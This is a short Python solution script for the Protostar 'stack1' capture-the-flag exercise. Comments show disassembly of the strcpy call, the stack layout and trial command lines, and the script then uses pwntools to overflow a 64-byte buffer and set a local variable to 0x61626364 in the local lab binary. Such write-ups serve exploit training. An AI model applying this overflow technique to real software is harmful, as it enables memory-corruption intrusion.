# 8048487:	c7 44 24 5c 00 00 00 	mov    DWORD PTR [esp+0x5c],0x0 # overwrite_me variable
#[...]
# 8048497:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
# 804849b:	8d 44 24 1c          	lea    eax,[esp+0x1c]
# 804849f:	89 04 24             	mov    DWORD PTR [esp],eax
# 80484a2:	e8 c1 fe ff ff       	call   8048368 <strcpy@plt>
# 80484a7:	8b 44 24 5c          	mov    eax,DWORD PTR [esp+0x5c]
# 80484ab:	3d 64 63 62 61       	cmp    eax,0x61626364

# The goal is to overwrite esp+0x5c with 0x61626364

# The stack layout is:
# | strcpy Buffer |
# | Local var 1   |
# | Local var 2   |
# | Saved EBP     |
# | Ret address   |
# | Arg 1         |
# | Arg 2         |

# SO we have to fill the strcpy buffer and overwrite the local variable content's

# homardboy@Arch  ~/Desktop/Protostar  ./stack1 `python -c 'print("A" * 64 + "BBBB")'`
# Try again, you got 0x42424242

# homardboy@Arch  ~/Desktop/Protostar  ./stack1 `python -c 'print("A" * 64 + "\x64\x63\x62\x61")'`
# you have correctly got the variable to the right value

from pwn import *

buff = b'A' * 64
arg = p32(0x61626364)

payload = buff + arg

sh = process(['./stack1', payload])

log.info('Overwriting the local variable esp+0x5c with 0x61626364')

result = sh.recvline()
print(result.decode())

